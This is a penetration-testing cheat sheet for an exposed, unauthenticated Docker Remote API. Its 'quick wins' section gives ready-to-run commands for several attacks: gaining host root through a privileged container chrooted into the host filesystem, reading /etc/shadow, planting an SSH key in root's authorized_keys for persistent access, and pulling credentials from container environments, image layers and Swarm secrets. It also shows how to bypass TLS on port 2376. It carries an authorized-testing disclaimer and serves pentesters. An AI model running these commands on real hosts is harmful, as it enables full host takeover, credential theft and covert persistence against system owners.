---
service: docker
title: Docker Remote API
ports: 2375, 2376
aliases: docker-api, docker-daemon
---

# Docker Remote API — quick wins

**When you see it:** 2375/tcp open and `docker -H tcp://H:2375 version` returns without
a TLS error → unauthenticated API, full daemon control. One command away from a privileged
container with the host root filesystem mounted = host root.

> Authorized testing only. Triage is read-only; steps marked ✏️ create containers or
> modify host state — clean up (`docker -H tcp://H:2375 rm -f <id>`) afterwards.

## Triage (read-only)
```sh
# Confirm unauthenticated access and get daemon version:
docker -H tcp://H:2375 version
curl -s http://H:2375/version | python3 -m json.tool

# Enumerate running containers:
docker -H tcp://H:2375 ps -a
curl -s http://H:2375/containers/json?all=1 | python3 -m json.tool

# List available images (may contain embedded creds in layers):
docker -H tcp://H:2375 images
curl -s http://H:2375/images/json | python3 -m json.tool

# Inspect running containers for env vars (DB creds, API keys):
docker -H tcp://H:2375 inspect $(docker -H tcp://H:2375 ps -q) \
  | python3 -m json.tool | grep -Ei '"env|secret|password|key|token"' -A 1
```

## Quick wins

### Host root via privileged container ✏️
```sh
docker -H tcp://H:2375 run -it --rm \
  --privileged --pid=host --net=host --ipc=host \
  -v /:/host \
  alpine chroot /host /bin/sh
```
*Why:* a privileged container with `--pid=host` and `/` bind-mounted drops you into a
`chroot` of the host root as UID 0 — read `/etc/shadow`, add SSH keys,
write cron jobs, or pivot anywhere on the host.

### Minimal host escape (read /etc/shadow)
```sh
docker -H tcp://H:2375 run --rm -v /etc:/host-etc alpine cat /host-etc/shadow
```
*Why:* even without `--privileged`, bind-mounting a specific host path is enough to
read any file; grab `/root/.ssh/` for keys or `/etc/shadow` for hash cracking.

### Add SSH key for persistent access ✏️
```sh
docker -H tcp://H:2375 run --rm \
  -v /root/.ssh:/host-ssh alpine sh -c \
  "echo 'YOUR_PUBKEY' >> /host-ssh/authorized_keys && chmod 600 /host-ssh/authorized_keys"
ssh root@H
```
*Why:* writing your public key to `/root/.ssh/authorized_keys` on the host via the bind
mount gives durable SSH access without touching container internals.

### Extract secrets from image layers
```sh
# Save and inspect image filesystem for embedded secrets:
docker -H tcp://H:2375 save IMAGE:TAG | tar -xO \
  | tar -t 2>/dev/null | grep -Ei "\.env|\.pem|\.key|id_rsa|password"
# Or inspect image history for ENV instructions:
docker -H tcp://H:2375 history --no-trunc IMAGE:TAG
```
*Why:* developers frequently bake credentials into `Dockerfile` `ENV` lines or config
files added during build — these survive even if the file is later `rm`'d (it exists in
an earlier layer).

### Enumerate Docker Swarm secrets (if Swarm enabled) ✏️
```sh
docker -H tcp://H:2375 secret ls
# Secrets values are not directly readable via API — but they are mounted
# inside service containers; exec into a running service to read them:
docker -H tcp://H:2375 exec $(docker -H tcp://H:2375 ps -q | head -1) \
  ls /run/secrets/
docker -H tcp://H:2375 exec $(docker -H tcp://H:2375 ps -q | head -1) \
  cat /run/secrets/SECRET_NAME
```
*Why:* Docker Swarm secrets are mounted as plaintext files inside containers — `exec`
into any running service task to read them directly.

### TLS-enabled API (port 2376) ✏️
```sh
# If the API requires client certs but accepts self-signed:
docker -H tcp://H:2376 --tlsverify=false version
# Or skip TLS entirely with curl:
curl -sk https://H:2376/version
```
*Why:* 2376 is the TLS port — if TLS is configured without client cert enforcement
(`--tlsverify`), the `--tlsverify=false` flag bypasses mutual auth.

## aranum helpers
- `aranumtoolkit/network/enum-docker.sh` — produced this finding; checks version,
  container list, and image exposure.

## Gotchas
- Port 2375 is plaintext HTTP; 2376 uses TLS. The daemon must be explicitly started with
  `-H tcp://0.0.0.0:2375` to listen remotely — check `ExecStart` in
  `/etc/systemd/system/docker.service` if you need to confirm the daemon config via an
  existing foothold.
- Docker Desktop on macOS/Windows does not expose 2375 remotely by default — this is a
  Linux daemon misconfiguration.
- `--privileged` + `--pid=host` is the maximum-privilege escape; on some hardened hosts
  Seccomp or AppArmor profiles may block specific syscalls even inside privileged
  containers — `chroot /host` still works for file access.
- Cleanup matters: containers created during testing must be removed (`docker rm -f ID`)
  and images deleted if pulled — leaving `alpine` or attack images on a production host
  will be noticed.
- If 2375 is filtered but the Docker socket (`/var/run/docker.sock`) is mounted into a
  container you already have access to, the same attacks apply via `docker -H
  unix:///var/run/docker.sock`.

## Sources
- HackTricks `2375,2376-pentesting-docker`; Hackviser Docker API Pentesting; VeryLazyTech
  Docker Port 2375/2376; SecureFlag Docker Privilege Escalation.
